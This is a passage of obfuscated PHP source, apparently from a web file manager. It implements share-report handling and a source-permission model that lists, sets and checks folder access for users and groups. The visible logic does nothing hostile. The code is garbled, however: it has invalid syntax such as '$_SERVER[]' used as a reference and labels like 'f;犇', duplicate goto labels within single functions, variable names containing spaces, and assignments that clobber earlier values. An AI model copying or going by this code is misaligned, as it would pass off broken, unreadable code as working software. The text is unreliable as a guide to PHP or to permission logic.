_folderReport($a꧎Ƈ) { goto BɃ; eߵ: $E՞ʳ = array($f[447] => array($f[7], $A£), $f[487] => array($f[380], "\45{$e}\45"), $f[423] => 0); $D = Model($f[796])->where($E՞ʳ)->field($f[1856])->find(); if (!$D) { return !1; } goto F; A踆: $D = array_to_keyvalue($Aꄜ, $f[33], $f[28]); $D[] = $D[$f[28]]; return implode($f[8], $D); goto eã; EЙˋ: if (!$A£) { return !1; } $A£ = array_to_keyvalue($A£, $f[33], $f[447]); $e = $f[47] . $a꧎Ƈ . $f[47]; goto eߵ; BɃ: $f =& $_SERVER[]; $E՞ʳ = array($f[447] => array($f[976], 0), $f[716] => 3); $A£ = Model($f[1855])->where($E՞ʳ)->field($f[447])->select(); goto EЙˋ; F: $dĲ = substr($D[$f[487]], strpos($D[$f[487]], $e)); $E՞ʳ = array($f[395] => array($f[7], trim($dĲ, $f[47]))); $Aꄜ = Model($f[796])->where($E՞ʳ)->field($f[28])->select(); goto A踆; eã: } protected function remove($f) { goto aʵԅ; cҫ: for ($Fԭ化 = 0; $Fԭ化 < count($eȦ); $Fԭ化++) { $aެ탑 = $this->getInfo($eȦ[$Fԭ化]); if ($aެ탑[$e[475]] == $e[87]) { Model($e[533])->eventShare($aެ탑[$e[395]], $e[1845]); } if ($aެ탑[$e[473]] == $e[87]) { Model($e[533])->eventShare($aެ탑[$e[395]], $e[1844]); } } return $Aξ; goto eܶ; aإ: $Aξ = $this->where($EՉ)->delete(); if ($Aξ) { Model($e[564])->where(array($e[468] => $f))->delete(); } $eȦ = is_array($f) ? $f[1] : array($f); goto cҫ; aʵԅ: $e =& $_SERVER[]; if (is_array($f)) { $f = array($e[7], $f); } $EՉ = array($e[468] => $f); goto aإ; eܶ: } protected function removeBySource($EȦ) { goto eė; Dǈ: $Aʧʡ = array_to_keyvalue($Aʧʡ, $F[33], $F[468]); if (!$Aʧʡ) { return; } $d = array($F[467] => array($F[411], $Aʧʡ)); goto e; e: $this->where($d)->delete(); Model($F[564])->where($d)->delete(); goto cఐ; eė: $F =& $_SERVER[]; $d = array($F[410] => array($F[411], $EȦ)); $Aʧʡ = $this->field($F[468])->where($d)->select(); goto Dǈ; cఐ: } public function listAll($D) { goto dұ׼ޝ; bֱ䉧: return $C̯; goto b; dұ׼ޝ: $a魜 =& $_SERVER[]; $Dķ = array(); if ($D[$a魜[1533]]) { $Dķ[$a魜[1533]] = $D[$a魜[1533]]; } goto F; f: $C̯ = $this->_makeOrder()->where($Dķ)->selectPage(20); if (empty($C̯[$a魜[367]])) { return array(); } $this->_listDataApply($C̯[$a魜[367]]); goto bֱ䉧; F: if ($D[$a魜[727]]) { $Dʰ = $D[$a魜[476]] ? $D[$a魜[476]] : strtotime(date($a魜[1857])); $Dķ[$a魜[194]] = array($a魜[331], array($D[$a魜[727]], $Dʰ)); } if ($D[$a魜[29]]) { $Dķ[$D[$a魜[29]]] = 1; } else { $Dķ[] = array($a魜[473] => array($a魜[976], 0), $a魜[475] => array($a魜[976], 0), $a魜[1834] => $a魜[1788]); } if ($D[$a魜[1784]]) { $Dķ[] = array($a魜[470] => $D[$a魜[1784]], $a魜[1439] => array($a魜[380], "\45{$D[$a魜[1784]]}\x25"), $a魜[1834] => $a魜[1788]); } goto f; b: } public function listDataApply($E) { $this->_listDataApply($E); return $E; } private function _listDataApply(&$cȜ) { goto Bꪡ; Bꪡ: $CȚ =& $_SERVER[]; $eۺ = array_to_keyvalue($cȜ, $CȚ[33], $CȚ[1533]); $DЋ = Model($CȚ[506])->userListInfo(array_unique($eۺ)); goto B͚; cܥ: unset($Fׯ); $cȜ = array_values($cȜ); goto Fߏ; B͚: $BФΌ = array_to_keyvalue($cȜ, $CȚ[33], $CȚ[395]); $cĚ߉ = Model($CȚ[796])->sourceListInfo($BФΌ, !0); foreach ($cȜ as $D => &$Fׯ) { $F = $Fׯ[$CȚ[1533]]; $Fׯ[$CȚ[1858]] = $DЋ[$F] ? $DЋ[$F] : !1; $eϋ߄ = $Fׯ[$CȚ[395]]; $Fׯ[$CȚ[85]] = $cĚ߉[$eϋ߄] ? $cĚ߉[$eϋ߄] : !1; if ($Fׯ[$CȚ[85]][$CȚ[423]] == $CȚ[87]) { unset($cȜ[$D]); } if ($Fׯ[$CȚ[85]] != $CȚ[191] && !$Fׯ[$CȚ[85]]) { unset($cȜ[$D]); } } goto cܥ; Fߏ: } private function _makeOrder($dχ = '') { goto Dݎ; AБӐ: $dχ = $dχ . "{$fۅ}\x20{$Eȉ}"; return $this->order($dχ); goto Bǃ쉶; f: $fۅ = Input::get($c瘯[435], $c瘯[7], $c瘯[416], $b쎂); $Eȉ = Input::get($c瘯[436], $c瘯[7], $c瘯[1859], array($c瘯[1783], $c瘯[430])); $Eȉ = $eث[$Eȉ]; goto AБӐ; Dݎ: $c瘯 =& $_SERVER[]; $b쎂 = array($c瘯[194], $c瘯[476], $c瘯[1847], $c瘯[1848]); $eث = array($c瘯[428] => $c瘯[429], $c瘯[430] => $c瘯[431]); goto f; Bǃ쉶: } public function reportAdd($D) { $A =& $_SERVER[]; $Cݐ = array($A[468] => $D[$A[468]], $A[1533] => USER_ID); if (Model($A[1855])->where($Cݐ)->find()) { return !1; } $B笣 = array($A[468] => $D[$A[468]], $A[1439] => $D[$A[1439]], $A[395] => $D[$A[395]], $A[447] => $D[$A[447]], $A[1533] => USER_ID, $A[29] => $D[$A[29]], $A[431] => $D[$A[431]]); return Model($A[1855])->add($B笣); } public function reportList($EЮ) { goto fќ; dÏͨǰ: if (isset($EЮ[$a[29]]) && in_array($EЮ[$a[29]], array($a[87], $a[1860], $a[1861], $a[1862], $a[1863]))) { $b򽇯[$a[29]] = $EЮ[$a[29]]; } if (isset($EЮ[$a[716]]) && in_array($EЮ[$a[716]], array($a[191], $a[87], $a[1860], $a[1861]))) { $b򽇯[$a[716]] = $EЮ[$a[716]]; } $EŊ = Input::get($a[436], $a[7], $a[1859], array($a[1783], $a[430])); goto f׈˦; f;犇: $this->_listDataApply($bֻ[$a[367]]); return $bֻ; goto AӍ; f׈˦: $Eߵ = array($a[428] => $a[429], $a[430] => $a[431]); $dԆЮ = $a[1864] . $Eߵ[$EŊ]; $bֻ = Model($a[1855])->where($b򽇯)->order($dԆЮ)->selectPage(20); goto a; fќ: $a =& $_SERVER[]; $b򽇯 = array(); if ($EЮ[$a[727]]) { $eˣ = $EЮ[$a[476]] ? $EЮ[$a[476]] : strtotime(date($a[1857])); $b򽇯[$a[194]] = array($a[331], array($EЮ[$a[727]], $eˣ)); } goto dÏͨǰ; a: if (empty($bֻ[$a[367]])) { return array(); } $E쬅 = array_to_keyvalue_group($bֻ[$a[367]], $a[716], $a[468]); if (!empty($E쬅[0])) { $EЮ = $E쬅[0]; $b򽇯 = array($a[468] => array($a[7], $EЮ)); $Fׇ = $this->where($b򽇯)->field($a[468])->select(); $Fׇ = array_to_keyvalue($Fׇ, $a[33], $a[468]); $cԧ = array_diff($EЮ, $Fׇ); if (!empty($cԧ)) { foreach ($bֻ[$a[367]] as $Dَ启 => $CӐ) { if (in_array($CӐ[$a[468]], $cԧ)) { unset($bֻ[$a[367]][$Dَ启]); } } } } goto f;犇; AӍ: } public function reportStatus($B梅) { goto a; A: if (!$A) { return !1; } $aꟵ = array($b綶[716] => $B梅[$b綶[716]]); if ($B梅[$b綶[716]] == $b綶[1861] && $A[$b綶[716]] == $b綶[1861]) { $aꟵ[$b綶[716]] = 0; } goto aʹ; eڲ: return $d; goto Aͩ; aʹ: $d = Model($b綶[1855])->where($b)->save($aꟵ); if ($B梅[$b綶[716]] == $b綶[1860]) { if ($A[$b綶[447]] != $b綶[191] && $this->shareFileMeta($A[$b綶[447]])) { $this->shareFileMeta($A[$b綶[447]], 0); } $this->remove($A[$b綶[468]]); return !0; } if ($d && $B梅[$b綶[716]] == $b綶[1861]) { $d륇Ժ = $aꟵ[$b綶[716]] == $b綶[1861] ? 1 : 0; $this->shareFileMeta($A[$b綶[447]], $d륇Ժ); $this->removeByFile($A[$b綶[447]]); } goto eڲ; a: $b綶 =& $_SERVER[]; $b = array($b綶[393] => $B梅[$b綶[393]]); $A = Model($b綶[1855])->where($b)->field($b綶[1865])->find(); goto A; Aͩ: } private function removeByFile($fٿ) { goto f; f: $A = array($eͅ[395] => array($eͅ[7], $E), $eͅ[473] => 1); $C̱镧 = $this->where($A)->field($eͅ[468])->select(); if (empty($C̱镧)) { return; } goto Dͯ; Dͯ: $b = array_to_keyvalue($C̱镧, $eͅ[33], $eͅ[468]); $this->remove($b); goto E򌑟; f: $eͅ =& $_SERVER[]; $C̱镧 = Model($eͅ[796])->where(array($eͅ[447] => $fٿ))->field($eͅ[395])->select(); $E = array_to_keyvalue($C̱镧, $eͅ[33], $eͅ[395]); goto f; E򌑟: } private function shareFileMeta($bϧ, $aݿ = null) { $eҲ =& $_SERVER[]; $cʑ = array($eҲ[447] => $bϧ, $eҲ[93] => $eҲ[1866]); if (is_null($aݿ)) { return Model($eҲ[1867])->where($cʑ)->find(); } $cʑ[$eҲ[372]] = $aݿ; Model($eҲ[1867])->add($cʑ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\143\x65\x5f\x61\x75\x74\150"; public function getAuth($Bш) { goto dƗߌˉ; e誕: array_multisort($bߒ, SORT_DESC, $eᚤ); return $eᚤ; goto c謶ސ; dƗߌˉ: $dԛ =& $_SERVER[]; $A͡ = $this->sourceAuthSelect($Bш); $eᚤ = array(); goto b; b: $bߒ = array(); $b = 2 << 25; foreach ($A͡ as $Dؘ֕) { goto eٵ̓; BÍԡ: $bً = 0; if ($Dؘ֕[$dԛ[404]] == SourceModel::TYPE_GROUP) { $bً = $b * 2; } if ($Dؘ֕[$dԛ[404]] == SourceModel::TYPE_USER) { $bً = $b; } goto bД; bД: if ($Dؘ֕[$dԛ[404]] == SourceModel::TYPE_USER && $Dؘ֕[$dԛ[484]] == $dԛ[191]) { $bً = 0; } $bߒ[] = $D[$dԛ[406]] + $bً; goto C٧Ɨ; eٵ̓: $D = Model($dԛ[1868])->listData($Dؘ֕[$dԛ[1796]]); if (!$D) { continue; } $eᚤ[] = $Dؘ֕; goto BÍԡ; C٧Ɨ: } goto e誕; c謶ސ: } public function sourceAuthSelect($b) { goto fش˝; c: if (count($fɦ秔) == count($b)) { return $fԩ ? $fɦ秔[$b[0]] : $fɦ秔; } $dқ = $fۅڦ[1869]; $bَ = array($fۅڦ[395] => array($fۅڦ[7], $b)); goto Dׅ; F،: if ($fԩ) { $b = array($b); } $fɦ秔 = array(); foreach ($b as $cŷ) { if (isset($cǢ[$cŷ])) { $fɦ秔[$cŷ] = $cǢ[$cŷ]; } } goto c; Dׅ: $a = $this->field($dқ)->order($fۅڦ[393])->where($bَ)->select(); $eȮ = array_to_keyvalue_group($a, $fۅڦ[395]); foreach ($b as $cŷ) { $cǢ[$cŷ] = $eȮ[$cŷ] ? $eȮ[$cŷ] : array(); } goto C; fش˝: $fۅڦ =& $_SERVER[]; static $cǢ = array(); $fԩ = is_array($b) ? !1 : !0; goto F،; C: if ($fԩ) { return $a; } return $eȮ; goto f; f: } public function setAuth($E惋, $b懭ᄲ) { goto Dŋ͵; fӡ: if ($dؔ != $e) { $d瘼Ѻ = array($bҫ[1701] => $dؔ); $E = Model($bҫ[1782])->field($bҫ[1533])->where($d瘼Ѻ)->select(); $E = array_to_keyvalue($E, $bҫ[33], $bҫ[1533]); } $Aˆ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $CŢ = array(); goto D; D: foreach ($b懭ᄲ as $a姺) { if (!in_array($a姺[$bҫ[404]], $Aˆ)) { show_json(LNG($bҫ[1870]), !1); } if ($dؔ != $e) { if ($a姺[$bҫ[404]] == SourceModel::TYPE_GROUP) { } if ($a姺[$bҫ[484]] != 0 && !in_array($a姺[$bҫ[484]], $E)) { } } if ($a姺[$bҫ[484]] == 0) { $a姺[$bҫ[404]] = SourceModel::TYPE_USER; } $CŢ[] = array($bҫ[395] => $E惋, $bҫ[404] => intval($a姺[$bҫ[404]]), $bҫ[484] => intval($a姺[$bҫ[484]]), $bҫ[1796] => intval($a姺[$bҫ[1796]]) ? intval($a姺[$bҫ[1796]]) : 0, $bҫ[1850] => intval($a姺[$bҫ[1850]]) ? intval($a姺[$bҫ[1850]]) : -1); } $this->where(array($bҫ[410] => $E惋))->delete(); $this->addAll($CŢ); goto cݏ҇; Dŋ͵: $bҫ =& $_SERVER[]; $b߃³ = Model($bҫ[1213])->sourceInfo($E惋); if (!$b߃³) { return !1; } goto bǘ; cݏ҇: return !0; goto cΫ; bǘ: if ($b߃³[$bҫ[404]] != SourceModel::TYPE_GROUP) { return !1; } $e = 1; $dؔ = $b߃³[$bҫ[484]]; goto fӡ; cΫ: } public function authClear($aʏξ) { $fЌ =& $_SERVER[]; $FγƟ = Model($fЌ[1213])->sourceInfo($aʏξ); $A ˖ = array($aʏξ); if ($FγƟ[$fЌ[403]] == $fЌ[87]) { $Bٙ = array($fЌ[553] => array($fЌ[512], $FγƟ[$fЌ[487]] . $aʏξ . $fЌ[513])); $A ˖ = Model($fЌ[1213])->field($fЌ[410])->where($Bٙ)->getField($fЌ[395], !0); $A ˖[] = $aʏξ; } $this->where(array($fЌ[410] => array($fЌ[411], $A ˖)))->delete(); return !0; } public function getAllChildren($d蜫э) { goto Fﱡ; bۄ: if ($e[$bҝ[404]] != SourceModel::TYPE_GROUP) { return array(); } $eۡ = 1; $C¤ = array($d蜫э); goto Cʕ; Cʕ: if ($e[$bҝ[478]] == $bҝ[191] && $e[$bҝ[484]] != $eۡ) { $C¤ = $this->groupChidldAllRootSource($e[$bҝ[484]]); } $f߂ͽ = $this->field($bҝ[395])->group($bҝ[395])->select(); $f߂ͽ = array_to_keyvalue($f߂ͽ, $bҝ[33], $bҝ[395]); goto Dϥ; A: $EԨ = Model($bҝ[796])->field($D)->where($aޡׂ)->select(); $A䓎 = array($d蜫э); foreach ($EԨ as $dԨ) { foreach ($C¤ as $A) { $dМ䍾 = $bҝ[47] . $A . $bҝ[47]; $A˧ = $dԨ[$bҝ[487]] . $dԨ[$bҝ[395]] . $bҝ[47]; if (strstr($A˧, $dМ䍾)) { $A䓎[] = $dԨ[$bҝ[395]]; break; } } } goto EۨáÐ; EۨáÐ: return $this->sourceListAuth($A䓎); goto B拯; Dϥ: if (!$f߂ͽ) { return array(); } $D = $bҝ[1871]; $aޡׂ = array($bҝ[395] => array($bҝ[7], $f߂ͽ), $bҝ[423] => $bҝ[191]); goto A; Fﱡ: $bҝ =& $_SERVER[]; $e = Model($bҝ[1213])->sourceInfo($d蜫э); if ($e[$bҝ[403]] != $bҝ[87]) { return $this->sourceListAuth(array($d蜫э)); } goto bۄ; B拯: } private function sourceListAuth($dЪ) { goto D; D: $bı䑖 =& $_SERVER[]; $F = Model($bı䑖[1213])->sourceListInfo($dЪ, !0); $Eċ = $this->sourceAuthSelect($dЪ); goto AΠ; fəЄ: array_multisort($bĄՍƊ, SORT_ASC, $F֡ٷ); return $F֡ٷ; goto BߓƑ; AΠ: $F֡ٷ = array(); $bĄՍƊ = array(); foreach ($F as $Fڪ) { goto E쾑͂; E쾑͂: unset($Fڪ[$bı䑖[434]]); unset($Fڪ[$bı䑖[432]]); unset($Fڪ[$bı䑖[406]]); goto d; e: $EҦڿ = count(explode($bı䑖[8], trim($Fڪ[$bı䑖[495]], $bı䑖[8]))); $bĄՍƊ[] = $EҦڿ + ($Fڪ[$bı䑖[29]] == $bı䑖[77] ? 0 : 1000); goto D; d: unset($Fڪ[$bı䑖[85]]); $bՈ = $Eċ[$Fڪ[$bı䑖[395]]]; if (!$bՈ) { continue; } goto b͸ˣ; b͸ˣ: $Fڪ[$bı䑖[1872]] = $this->authTargetInfo($bՈ); $Fڪ[$bı䑖[495]] = rtrim($Fڪ[$bı䑖[490]], $bı䑖[8]) . $bı䑖[8] . ltrim($Fڪ[$bı䑖[495]], $bı䑖[8]); $F֡ٷ[] = $Fڪ; goto e; D: } goto fəЄ; BߓƑ: } private function groupChidldAllRootSource($b߉) { $bޟɲ =& $_SERVER[]; $eۇˊ = Model($bޟɲ[1873])->groupChildrenAll($b߉); $C = array($bޟɲ[478] => 0, $bޟɲ[484] => array($bޟɲ[7], $eۇˊ), $bޟɲ[404] => SourceModel::TYPE_GROUP); $aƪ = Model($bޟɲ[796])->field($bޟɲ[395])->where($C)->select(); $aƪ = array_to_keyvalue($aƪ, $bޟɲ[33], $bޟɲ[395]); return $aƪ; } private function authTargetInfo($B) { goto A; f돳: $dɽ = 2 << 25; foreach ($B as $d՜Ɋ) { goto Bő鞌; Eޔ: if ($d՜Ɋ[$e[404]] == SourceModel::TYPE_USER && $d՜Ɋ[$e[484]] == $e[191]) { $c۷ = 0; } $AЄĸ[] = $C׃Î[$e[406]] + $c۷; goto Aދ; DзЎ: $c۷ = 0; if ($d՜Ɋ[$e[404]] == SourceModel::TYPE_GROUP) { $c۷ = $dɽ * 2; } if ($d՜Ɋ[$e[404]] == SourceModel::TYPE_USER) { $c۷ = $dɽ; } goto Eޔ; Bő鞌: $C׃Î = Model($e[1868])->listData($d՜Ɋ[$e[1796]]); if (!$C׃Î) { continue; } if ($d՜Ɋ[$e[404]] == SourceModel::TYPE_USER) { $A = Model($e[502])->getInfoSimpleOuter($d՜Ɋ[$e[484]]); if ($A[$e[1533]] == $e[1092]) { continue; } if ($A[$e[1533]] == $e[191]) { $A[$e[28]] = LNG($e[1874]); } } else { $A = Model($e[486])->getInfoSimple($d՜Ɋ[$e[484]]); } goto B萎; B萎: if (!$A) { continue; } $A[$e[446]] = $C׃Î; $e[] = $A; goto DзЎ; Aދ: } array_multisort($AЄĸ, SORT_DESC, $e); goto aת; A: $e =& $_SERVER[]; $e = array(); $AЄĸ = array(); goto f돳; aת: return $e; goto Cט; Cט: } public function getAllChildrenByUser($C⽮, $Fڽ) { goto d䴦; FԞ: foreach ($Dȱ as $f֎) { $B׬٭ = !1; foreach ($f֎[$AՓܗ[1872]] as $b賈) { if ($b賈[$AՓܗ[1533]]) { if ($b賈[$AՓܗ[1533]] == $Fڽ) { $B׬٭ = !0; break; } } if ($b賈[$AՓܗ[1701]]) { if ($this->groupContainUser($b賈[$AՓܗ[1701]], $Fڽ)) { $B׬٭ = !0; break; } } } if ($B׬٭) { $BՂ[] = $f֎; } $eҽ = $f֎[$AՓܗ[395]]; if (isset($D𷍹[$eҽ])) { $f֎[$AՓܗ[1872]][] = $D𷍹[$eҽ][0]; $D𷍹[$eҽ] = !1; } } $D𷍹 = array_filter(array_values($D𷍹)); $BՂ = array_merge($D𷍹, $BՂ); goto Eǹ; B鉴: if ($FĎ[$AՓܗ[478]] == $AՓܗ[191] && $FĎ[$AՓܗ[484]] != $B˶ && $this->groupContainUser($FĎ[$AՓܗ[484]], $Fڽ)) { foreach ($E[$AՓܗ[1875]] as $E) { $c = Model($AՓܗ[486])->getInfo($E[$AՓܗ[1701]]); $fР = Model($AՓܗ[506])->getInfoSimpleOuter($Fڽ); $fР[$AՓܗ[446]] = $E[$AՓܗ[406]]; if (Model($AՓܗ[1868])->authCheckAction($E[$AՓܗ[406]][$AՓܗ[406]], $AՓܗ[1721])) { continue; } $bݴ = array($AՓܗ[28] => $AՓܗ[1486] . $c[$AՓܗ[28]], $AՓܗ[395] => $c[$AՓܗ[85]][$AՓܗ[395]], $AՓܗ[76] => KodIO::make($c[$AՓܗ[85]][$AՓܗ[395]]), $AՓܗ[478] => $AՓܗ[191], $AՓܗ[404] => $AՓܗ[1022], $AՓܗ[29] => $AՓܗ[517], $AՓܗ[495] => $c[$AՓܗ[491]], $AՓܗ[1701] => $c[$AՓܗ[1701]], $AՓܗ[488] => $c[$AՓܗ[478]], $AՓܗ[1872] => array($fР)); $D𷍹[$bݴ[$AՓܗ[395]]] = $bݴ; } } $BՂ = array(); $Dȱ = $this->getAllChildren($C⽮); goto FԞ; d䴦: $AՓܗ =& $_SERVER[]; $E = Model($AՓܗ[506])->getInfo($Fڽ); if (!$Fڽ || !$C⽮ || !$E) { return array(); } goto dĖ; dĖ: $FĎ = Model($AՓܗ[1213])->sourceInfo($C⽮); $D𷍹 = array(); $B˶ = 1; goto B鉴; Eǹ: return $BՂ; goto F; F: } public function setAllChildrenByUser($C݅, $bޘͯ, $Cʹ) { $fսכ =& $_SERVER[]; $Aخ = $this->getAllChildrenByUser($C݅, $bޘͯ); if (!$Cʹ || !$Aخ) { return !1; } foreach ($Aخ as $F̃) { $E = array(); foreach ($F̃[$fսכ[1872]] as $Aɯ) { $C֯ = $Aɯ[$fսכ[446]]; $eʛ = $Aɯ[$fսכ[1533]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $dمݍ = $Aɯ[$fսכ[1533]] ? $Aɯ[$fսכ[1533]] : $Aɯ[$fսכ[1701]]; if ($Aɯ[$fսכ[1533]] && $Aɯ[$fսכ[1533]] == $bޘͯ) { continue; } $E[] = array($fսכ[395] => $F̃[$fսכ[395]], $fսכ[404] => $eʛ, $fսכ[484] => intval($dمݍ), $fսכ[1796] => isset($C֯[$fսכ[393]]) ? intval($C֯[$fսכ[393]]) : 0, $fսכ[1850] => isset($C֯[$fսכ[1850]]) ? intval($C֯[$fսכ[1850]]) : -1); } $E[] = array($fսכ[395] => $F̃[$fսכ[395]], $fսכ[404] => SourceModel::TYPE_USER, $fսכ[484] => intval($bޘͯ), $fսכ[1796] => intval($Cʹ), $fսכ[1850] => -1); $this->where(array($fսכ[410] => $F̃[$fսכ[395]]))->delete(); $this->addAll($E); } return !0; } public function get($d) { $F = $this->getSourceList(array($d), !0); return $F[0]; } public function getSourceList($dٛݨ, $c = false, $A٠ = false) { goto D蟉ɐ; E٬: $b = $this->sourceAuthSelect($F); $E䢃 = array(); foreach ($F as $cӦ) { if (isset($b[$cӦ])) { $E䢃[$cӦ] = $b[$cӦ]; } } goto eي; D蟉ɐ: $C =& $_SERVER[]; if (!$dٛݨ) { return array(); } $C = Model($C[1213]); goto fԖ; f̓: foreach ($c as $bּ => $B㤅准) { $e = $C->parentLevelArray($B㤅准[$C[487]]); $F = array_merge($F, array($bּ), array_reverse($e)); } $F = array_values(array_unique($F)); if (!$F) { return array(); } goto E٬; fԖ: if (!$c && count($dٛݨ) == 1) { $c = array(); $c[$dٛݨ[0]] = $C->sourceInfo($dٛݨ[0]); } if (!$c) { $Fĉ۶ն = array($C[410] => array($C[411], $dٛݨ)); $c = $C->field($C[1876])->where($Fĉ۶ն)->select(); $c = array_to_keyvalue($c, $C[395]); } $F = $dٛݨ; goto f̓; eي: $D = $this->userIsRoot($A٠); $cٖ = AuthModel::authAll(); $f̳ = array($C[407] => $cٖ, $C[1877] => array($C[412] => 0, $C[1707] => $cٖ, $C[413] => LNG($C[1878]), $C[1722] => $C[1879])); goto d߮խ; d߮խ: $F = array(); foreach ($c as $cӦ => $dҼ) { if ($D) { $F[$cӦ] = $f̳; continue; } $F[$cӦ] = $this->makeSourceAuth($dҼ, $E䢃, $A٠); } return $F; goto A֨㝒; A֨㝒: } public function authDeepCheck($e, $Cȡ = false) { goto D; a: if (!$C) { return !1; } $C΍ = $C ? $C[0] : $e; return array($aا[407] => -1, $aا[446] => array($aا[412] => $aا[1092], $aا[1707] => $aا[191], $aا[413] => LNG($aا[1882]), $aا[1722] => $aا[1883]), $aا[1884] => LNG($aا[1885]), $aا[1886] => $this->sourceAuthInfo($C΍)); goto e; D: $aا =& $_SERVER[]; $Cȡ = $Cȡ ? $Cȡ : USER_ID; $a÷Ǘ = $this->makeAuthDeep($Cȡ); goto a; a: if (!in_array($e, $a÷Ǘ[$aا[1880]])) { return !1; } $C = array(); foreach ($a÷Ǘ[$aا[1881]] as $Eϯ => $Dٝ) { if (!in_array($e, $Dٝ)) { continue; } $C[] = $Eϯ; } goto a; e: } protected function makeAuthDeep($eǖ = false) { goto b䤍; Eܥ: if ($C) { $A = array(array($C˗[404] => SourceModel::TYPE_USER, $C˗[484] => $eǖ), array($C˗[404] => SourceModel::TYPE_GROUP, $C˗[484] => array($C˗[411], $C)), $C˗[964] => $C˗[1788]); } $bɗ댛 = $this->field($C˗[1888])->where($A)->select(); $aﵚІ = array(); goto b; c: $fϿ = array(); $F = array(); $C = array(); goto A; d΢: if (isset($cۑҢ[$eǖ])) { return $cۑҢ[$eǖ]; } $aȫ = Model($C˗[1887])->listData(); $d׆ = array(); goto F̠; e: $bŕ = $C; $c霷Β = Model($C˗[1213]); $a = Model($C˗[486]); goto c; Eஆ: $Dӏ = $bŕ; foreach ($Dӏ as $A) { $D = $a->getInfo($A); $a = $c霷Β->parentLevelArray($D[$C˗[487]]); $bŕ = array_merge($bŕ, $a); } $bŕ = array_values(array_unique($bŕ)); goto e۫󇾖; b䤍: $C˗ =& $_SERVER[]; static $cۑҢ = array(); $eǖ = $eǖ ? $eǖ : USER_ID; goto d΢; A: $e = array(); if ($aﵚІ) { $cޏԎߞ = $c霷Β->where(array($C˗[395] => array($C˗[411], $aﵚІ)))->select(); foreach ($cޏԎߞ as $e) { $a = $c霷Β->parentLevelArray($e[$C˗[487]]); $d굴 = array_merge($d굴, $a); $bŕ[] = $e[$C˗[484]]; $fϿ[$e[$C˗[395]]] = $a; $F[$e[$C˗[395]]] = $e[$C˗[484]]; } } $bŕ = array_values(array_unique($bŕ)); goto Eஆ; e۫󇾖: foreach ($bŕ as $A) { $D = $a->getInfo($A); $d굴[] = $D[$C˗[85]][$C˗[395]]; $C[$A] = $D[$C˗[85]][$C˗[395]]; $e[$A] = $c霷Β->parentLevelArray($D[$C˗[487]]); } foreach ($fϿ as $bǜ => $EÛ) { $Bׄ = $F[$bǜ]; if (!$Bׄ || !$C[$Bׄ]) { continue; } $aѡ = array(); foreach ($e[$Bׄ] as $A) { $aѡ[] = $C[$A]; } $fϿ[$bǜ] = array_merge($aѡ, $EÛ); } $d굴 = array_values(array_unique($d굴)); goto d腣ϵ; b: $b̠ = array_to_keyvalue_group($bɗ댛, $C˗[395]); foreach ($b̠ as $DѶµ => $b) { $E͖ = $this->authArrayCheck($b, $eǖ); if ($E͖[$C˗[407]] > 0) { $aﵚІ[] = $DѶµ . $C˗[33]; } } $d굴 = array(); goto e; d腣ϵ: $bΗ = array($C˗[1880] => $d굴, $C˗[1881] => $fϿ); $cۑҢ[$eǖ] = $bΗ; return $bΗ; goto A̕; F̠: foreach ($aȫ as $bĄ) { if ($bĄ[$C˗[406]] == 0 && $bĄ[$C˗[1723]] == $C˗[87]) { $d׆[] = $bĄ[$C˗[393]]; } } $C = $this->userGroupParents($eǖ); $A = array($C˗[404] => SourceModel::TYPE_USER, $C˗[484] => $eǖ); goto Eܥ; A̕: } private function makeSourceAuth($aƌ, $FǉΌ, $Fڰƙ = false) { goto cɂ; AÚЩ: if (!$c׈) { $dʪ = Model($e󍎸Κ[486])->getInfo($Aɶ); $Dҋ = explode($e󍎸Κ[47], trim($dʪ[$e󍎸Κ[487]], $e󍎸Κ[47])); $Dҋ = array_reverse($Dҋ); foreach ($Dҋ as $A߂) { if ($A߂ == $e󍎸Κ[191] || $A߂ == $c) { continue; } $F魎 = $this->groupRootAuth($A߂, $Fڰƙ); if (!$F魎) { continue; } $c׈ = $this->groupAuthInfo($F魎, $A߂); break; } } if (!$c׈ || $c׈[$e󍎸Κ[407]] <= 0) { $Fւ̣ = $this->authDeepCheck($aƌ[$e󍎸Κ[395]], $Fڰƙ); if ($Fւ̣) { $c׈ = $Fւ̣; } } return $c׈; goto bؾ; Fђ: $a݈ = $aƌ[$e󍎸Κ[404]] == SourceModel::TYPE_GROUP; $E = $a݈ ? $this->groupRootAuth($Aɶ, $Fڰƙ) : !1; if ($E && Model($e󍎸Κ[1868])->authCheckAction($E[$e󍎸Κ[406]], $e󍎸Κ[1721])) { return $this->groupAuthInfo($E, $Aɶ); } goto DС; cɂ: $e󍎸Κ =& $_SERVER[]; $c = $e󍎸Κ[87]; $Aɶ = $aƌ[$e󍎸Κ[484]]; goto Fђ; DС: $D؆ = Model($e󍎸Κ[1213])->parentLevelArray($aƌ[$e󍎸Κ[487]]); $D؆ = array_merge(array($aƌ[$e󍎸Κ[395]]), array_reverse($D؆)); $c׈ = !1; goto Cǚ; Cǚ: foreach ($D؆ as $D򰂆) { if (!isset($FǉΌ[$D򰂆])) { continue; } $bʳ = $this->authMake($FǉΌ[$D򰂆], $Fڰƙ); if ($bʳ[$e󍎸Κ[446]]) { $c׈ = $bʳ; break; } } if (!$a݈) { return $c׈; } if (!$c׈ && $E) { $c׈ = $this->groupAuthInfo($E, $Aɶ); } goto AÚЩ; bؾ: } private function userIsRoot($D = false) { $Eͣ =& $_SERVER[]; if (!$D && _get($GLOBALS, $Eͣ[485])) { return !0; } $b = Model($Eͣ[506])->getInfo($D); $C = Model($Eͣ[1889])->listData($b[$Eͣ[1418]]); if ($C && $C[$Eͣ[1290]][$Eͣ[1890]] == 1) { return !0; } return !1; } private function sourceAuthInfo($D) { goto cČ; eݕ: $fͿ = $Aఉ->_listAppendPath($fͿ); $F = $fͿ[0]; $d˜녓 = $F[$dϋ߃[495]]; goto e; e: if (isset($F[$dϋ߃[492]])) { $eه = explode($dϋ߃[8], trim($F[$dϋ߃[495]], $dϋ߃[8])); array_shift($eه); $d˜녓 = $F[$dϋ߃[490]] . $dϋ߃[1891] . implode($dϋ߃[8], $eه); } return array($dϋ߃[413] => $F[$dϋ߃[28]], $dϋ߃[76] => KodIO::make($F[$dϋ߃[395]]), $dϋ߃[1892] => $d˜녓); goto d; cČ: $dϋ߃ =& $_SERVER[]; $Aఉ = Model($dϋ߃[1213]); $F = $Aఉ->sourceInfo($D); goto A٤ۋ; A٤ۋ: if (!$F) { return !1; } 